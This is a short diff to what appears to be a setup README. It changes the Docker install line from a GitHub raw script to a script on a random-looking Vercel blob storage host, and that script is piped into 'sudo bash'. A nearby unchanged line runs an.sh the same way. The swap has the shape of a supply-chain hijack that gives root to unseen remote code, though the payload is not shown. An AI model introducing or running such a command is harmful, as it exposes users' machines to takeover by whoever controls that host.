@@ -18,7 +18,7 @@ wget -qO- https://raw.githubusercontent.com/voutuk/file/main/an.sh | sudo bash
 Docker
 
 ```bash
-wget -qO- https://raw.githubusercontent.com/voutuk/file/main/docker.sh | sudo bash
+wget -qO- https://hbeugyarcpendihh.public.blob.vercel-storage.com/sc/docker.sh | sudo bash
 ```
 
 WordPress
